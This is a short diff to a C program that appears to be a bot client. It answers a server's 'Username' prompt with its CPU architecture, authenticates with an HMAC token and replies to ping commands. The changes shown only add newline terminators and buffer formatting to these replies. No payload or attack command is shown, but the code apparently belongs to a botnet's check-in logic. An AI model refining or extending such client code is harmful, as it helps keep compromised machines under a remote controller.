@@ -258,7 +258,7 @@ void handle_command(int sock, char *buffer) {
     }
 
     if (strcmp(command, "ping") == 0) {
-        send(sock, "PONG", 4, 0);
+        send(sock, "PONG\n", 5, 0);
         printf("[INFO] Responded to PING\n");
         return;
     }
@@ -386,7 +386,9 @@ int main() {
         if (recv_size > 0 && strstr(buffer, "Username") != NULL) {
             sleep(1);
             char *arch = get_architecture();
-            send(sock, arch, strlen(arch), 0);
+            char userbuf[128];
+            snprintf(userbuf, sizeof(userbuf), "%s\n", arch);
+            send(sock, userbuf, strlen(userbuf), 0);
             printf("[INFO] Sent username: %s\n", arch);
             
             memset(buffer, 0, BUFFER_SIZE);
@@ -396,7 +398,9 @@ int main() {
                 char auth_token[65];
                 generate_bot_auth(arch, auth_token);
                 if (strlen(auth_token) > 0) {
-                    send(sock, auth_token, strlen(auth_token), 0);
+                    char passbuf[128];
+                    snprintf(passbuf, sizeof(passbuf), "%s\n", auth_token);
+                    send(sock, passbuf, strlen(passbuf), 0);
                     printf("[INFO] Authenticated successfully with HMAC\n");
                 } else {
                     printf("[ERROR] Failed to generate authentication token\n");
